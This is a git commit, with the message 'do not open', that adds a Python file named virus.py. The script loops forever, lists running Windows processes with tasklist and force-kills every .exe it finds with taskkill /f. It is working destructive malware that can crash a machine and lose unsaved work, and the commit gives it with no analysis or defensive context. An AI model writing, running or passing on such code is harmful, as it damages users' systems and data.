fb6e9df646d717b6ed741b1b56d52df0e07cd439
kelvindoe22 <kelvindoe22@gmail.com>
2021-02-27 02:22:21 +0000

    do not open

---
+++ virus.py
@@ -0,0 +1,15 @@
+import os
+while 1:
+    os.system('tasklist > exefiles.txt')
+    open_exefile=open('exefiles.txt','r+')
+    lineread=open_exefile.readlines()
+    exeapps=[]
+    for ifexe in lineread:
+        if '.exe' in ifexe:
+            exeapps.append(ifexe)
+    finalexe=[]
+    for finexe in exeapps:
+        pos=finexe.find('.exe')
+        finalexe.append(finexe[0:(pos+4)])
+    for kill in finalexe:
+        os.system(f'taskkill /f /im {kill}')
